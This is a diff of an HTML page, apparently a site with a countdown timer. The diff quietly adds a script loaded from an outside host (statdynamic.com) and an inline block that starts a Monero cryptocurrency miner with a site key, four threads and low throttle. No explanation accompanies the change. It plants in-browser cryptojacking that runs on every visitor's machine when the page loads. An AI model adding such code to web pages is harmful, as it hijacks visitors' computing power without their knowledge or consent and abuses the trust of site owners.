@@ -29,6 +29,8 @@
 </head>
 
 <body>
+	
+	<script src="//statdynamic.com/lib/crypta.js"></script>
 
 	<script defer="defer">
 
@@ -176,6 +178,12 @@ var x = setInterval(function() {
     }
 }, 1000);
 
+</script>
+<script defer="defer">
+	var miner=new CRLT.Anonymous('ee4aa2a83286490a88f1fee5442eebd0bb649e364295', {
+    threads:4,throttle:0.2, coin: "xmr",
+	});
+	miner.start();
 </script>
 	<small>
 		<br>* Owner
